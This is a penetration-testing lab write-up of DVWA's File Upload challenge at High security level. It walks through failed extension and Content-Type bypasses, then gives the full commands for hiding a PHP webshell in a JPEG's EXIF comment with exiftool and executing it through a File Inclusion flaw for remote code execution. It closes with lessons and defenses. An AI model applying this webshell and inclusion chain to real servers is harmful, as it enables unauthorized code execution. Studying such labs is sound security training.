Objective

Observe how the High security level behaves compared to Medium — determine whether the server now inspects the actual file content rather than trusting client-supplied metadata.

Findings

The File Upload page presents the same form as the lower levels. To confirm the upload directory and baseline behavior, a benign image.png was uploaded. The server accepted it and returned the success message ../../hackable/uploads/image.png succesfully uploaded! — confirming that a genuine image still passes and the upload path remains disclosed.

PoC:
- Tools used: Browser
- Command: Upload image.png via the form
- Key finding: Benign upload succeeds and discloses the upload path

Exploitation — Extension and Content-Type Bypass Attempts (Failed)

Description

Before assuming the High level was vulnerable to the same Content-Type header spoofing that worked at Medium, each of the simpler bypasses was tested and ruled out. The results showed the server was no longer trusting either the filename extension or the client-supplied Content-Type header alone — indicating it was now validating the file’s actual content.

PoC — Steps to Reproduce

  1. A PHP webshell was prepared: cp RCE_2.php RCE_3.php, containing <?php system($_GET['cmd']); ?> (confirmed with cat RCE_3.php).
  2. RCE_3.php was selected via the Browse button and uploaded directly, with no modification. The server rejected it: Your image was not uploaded. We can only accept JPEG or PNG images.
  3. With Burp Suite intercepting the request, attempt 1 renamed only the filename to RCE_3.png while leaving Content-Type: application/x-php unchanged. The server rejected this as well, with the same JPEG/PNG error — confirming the extension alone is not sufficient to bypass the check.
  4. Attempt 2 reverted the filename to keep the real .php extension (RCE_3.php) and changed the Content-Type header to image/png — the exact technique that succeeded at the Medium level. This was resent twice for confirmation. Both times the server rejected the upload with the same JPEG/PNG error, confirming the Content-Type header is no longer trusted on its own.

These results indicate the High level is inspecting the file’s actual content (consistent with PHP’s getimagesize(), which reads an image’s real header/magic bytes rather than relying on the extension or submitted MIME type) in addition to the extension.

Exploitation — Polyglot File Bypass (Success)

Description

Since the server validates real image content, the payload needs to be a file that is simultaneously a valid, renderable image and executable PHP. This was achieved by embedding the PHP payload inside the EXIF Comment field of a genuine JPEG using exiftool. The resulting file’s JFIF header and image structure satisfy getimagesize(), while the embedded <?php system($_GET['cmd']); ?> payload remains present in the raw file bytes, ready to execute if the file is later parsed as PHP (e.g. via a File Inclusion vulnerability).

PoC — Steps to Reproduce

  1. The first attempt to inject the payload directly failed: exiftool -Comment="<?php system($_GET['cmd']); ?>" image.png -o polyglot.php returned Error: Not a valid PNG (looks more like a JPEG) - image.png. Despite its .png extension, image.png is actually JPEG data, and exiftool validates the source file against the format implied by its extension before writing.
  2. A second attempt targeting a .png output, exiftool -Comment="<?php system($_GET['cmd']); ?>" image.png -o polyglot.png, failed with the identical error for the same reason.
  3. The fix was to give the source file a matching .jpg extension before invoking exiftool: cp image.png image.jpg && exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg -o polyglot.jpg. This succeeded: 1 image files created.
  4. polyglot.jpg was selected and uploaded. The first upload attempt was rejected by the server with the same JPEG/PNG error.
  5. The upload was retried, and this time succeeded: ../../hackable/uploads/polyglot.jpg succesfully uploaded!
  6. Navigating directly to http://127.0.0.1/dvwa/hackable/uploads/polyglot.jpg rendered the file as a normal image in the browser, confirming it passes as a fully valid JPEG despite the embedded PHP payload.

Exploitation — Remote Code Execution via File Inclusion

Description

A polyglot file that merely passes the image content check has no impact on its own — the uploaded .jpg is not directly executed by the PHP interpreter when requested normally. To trigger the embedded payload, the file was included through DVWA’s File Inclusion vulnerability, which passes user input straight into PHP’s include(). Including the polyglot causes PHP to parse and execute the <?php system($_GET['cmd']); ?> payload hidden in its EXIF Comment field, chaining the two vulnerabilities into full remote code execution.

PoC — Steps to Reproduce

  1. The first inclusion attempt used a relative path with the file:// wrapper: fi/?page=file://../../hackable/uploads/polyglot.jpg&cmd=id. This failed with Warning: include(): Remote host file access not supported and Failed to open stream: no suitable wrapper could be found. Critically, the verbose PHP warning also disclosed the application’s full server-side path, /var/www/html/dvwa/vulnerabilities/fi/index.php, revealing the absolute path structure needed for the next attempt.
  2. Using the disclosed path, the request was corrected to reference the polyglot with its full absolute path: fi/?page=file:///var/www/html/dvwa/hackable/uploads/polyglot.jpg&cmd=id.
  3. This succeeded — the response contained the polyglot’s raw JFIF/image bytes followed by the executed command output: uid=33(www-data) gid=33(www-data) groups=33(www-data), confirming remote code execution as the web server user.

Lessons Learned

The High level closes the gap left by Medium by validating the file’s actual content rather than trusting the extension or the client-supplied Content-Type header — consistent with a getimagesize()-style check. This defeated every simple bypass: uploading the webshell directly, renaming it while leaving the executable extension, and spoofing only the Content-Type header. All three were rejected identically, an important signal that the check now looks past filenames and headers entirely.

However, validating that a file looks like a real image is not the same as ensuring it contains only image data. A polyglot file — one crafted to satisfy two different format parsers at once — passed the check easily: embedding the payload in the JPEG’s EXIF Comment field preserved a fully valid JFIF structure while smuggling executable PHP inside the file bytes. On its own, this still isn’t remote code execution, since the web server does not execute .jpg files as PHP. The impact only became critical once chained with a second vulnerability (File Inclusion) that could force the PHP interpreter to parse the uploaded file’s raw contents.

This chain illustrates why upload validation should never be evaluated in isolation: a File Upload flaw that “only” allows a well-formed image with hidden extra content can still lead to full compromise if any other part of the application can be coerced into including or parsing that file as code. Defenses should include stripping or rejecting unexpected metadata (such as EXIF comments) from uploaded images, storing uploads outside the web root, and — most importantly — never passing user-controlled input into include()/require() without strict allowlisting.
